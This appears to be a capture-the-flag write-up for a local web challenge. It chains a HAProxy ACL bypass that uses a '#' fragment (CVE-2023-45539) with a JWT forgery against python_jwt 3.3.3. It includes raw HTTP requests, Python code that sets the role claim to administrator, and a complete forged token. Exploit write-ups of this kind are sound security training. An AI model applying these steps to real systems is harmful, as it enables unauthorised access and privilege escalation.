### Get access ticket by bypassing HAProxy ACL with **#** fragment 
Based on [CVE-2023-45539 advisory description](https://www.cvedetails.com/cve/CVE-2023-45539/), HAProxy accepts # (fragment) as part of URI, which allows ACL bypass on blocked endpoint by frontend. \
In the given application, there is an ACL for **/api/v1/get_ticket** endpoint.
```bash
...

http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }

...
```
By utilizing the # fragment on the /api/v1/get_ticket endpoint, we can bypass the ACL, obtain the JWT token, and proceed with the next stage of exploitation.
```bash
GET /api/v1/get_ticket# HTTP/1.1
Host: localhost:1337
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
Connection: close
```
```bash
HTTP/1.1 200 OK
content-type: application/json
content-length: 554
server: uWSGI Server
connection: close

{"ticket: ":"[JWT_TOKEN]"}
```

### Forging a new JWT Token with tampered claims in order to bypass role restrictions
python_jwt module version 3.3.3 is vulnerable to forging new valid JWT tokens without knowing the secret used by the backend to verify the JWT tokens. Exploiting this vulnerability, a user could bypass role restrictions and hijack user identities by tampering with existing token claims and adding new ones. \
 \
Exploit involves constructing a fake JWT by tampering with the payload section while preserving the original header and signature. Through careful manipulation of base64-encoded payload data, attackers can inject unauthorized claims such as altering user identities or extending token expiration times.

In order to forge a new token with tampered claims, we need to obtain a valid JWT token from the */api/v1/get_ticket* endpoint. \

Let's create the script for generating a tampered token. First, we need to parse the three parts of the JWT token: header, payload, and signature.
```python
[header, payload, signature] = token.split(".")
```
\
Decode from base64 and parse into a JSON object the JWT token. \
On the second line we change the role of the JWT token to administrator
```python
parsed_payload = loads(base64url_decode(payload))
parsed_payload["role"] = "administrator"
```
\
Generate final JWT token. The fake_payload line its serializes the `parsed_payload` JSON object into a string using `json.dumps` with custom seperators such as  (, for items and ':' for key-value pairs). Then, it encodes the string using `base64url_encode` which encodes the string to a valid base64 format. \

The return statement constructs a new JWT token string. It includes:
- header: The original header of the JWT token.
- fake_payload: The manipulated payload, which has been encoded and formatted.
- "":"": An empty field between the header and payload.
- "protected": The header again.
- "payload": The original payload.
- "signature": The original signature.
```python
fake_payload = base64url_encode((dumps(parsed_payload, separators=(',',':'))))
return '{" ' + header + '.'+ fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'
```

### Get the flag
After generating the final JWT token, a GET flag request should look like the following:
```bash
GET /api/v1/flag HTTP/1.1
Host: localhost:1337
Authorization: {" eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MDkxMzQ5MzgsImlhdCI6MTcwOTEzMTMzOCwianRpIjoiaEF3Yy0wN3Z6S1J0ZE5CVFRCTHIxQSIsIm5iZiI6MTcwOTEzMTMzOCwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MDkxMzQ5MzgsImlhdCI6MTcwOTEzMTMzOCwianRpIjoiaEF3Yy0wN3Z6S1J0ZE5CVFRCTHIxQSIsIm5iZiI6MTcwOTEzMTMzOCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"hXIK5TCaHej4Q_ZNpXHb-e4Lssd8sFw1Xx9M-8hdKotb0OPwE5-tymyHXODh7TY2J6xHNCiKkGUYS9JwyDWuwQV7fAaospyE4njbEJOF3qiT-sXUkSbwMVMYHMQ9AiGsBJFjPaA__8l6NrqKKcBO-aPvg-7tlMA0YIbG_KewcRbnI7Bu1ewfkY4-0N4MVZdAuExETnal7FnKcTiyx0v8zKTwbkn1hf1ATLb8zkdisj_TAghukx_6r3VCB1slhbnmbHOPqpIOs5HdEu9v8KC74g23UqE7yvC2H_HRJuS73Y9Q6sARdmtUI1e0ooWyo7Lsv0zTA30Z47mrEIcVk2IWjg"}
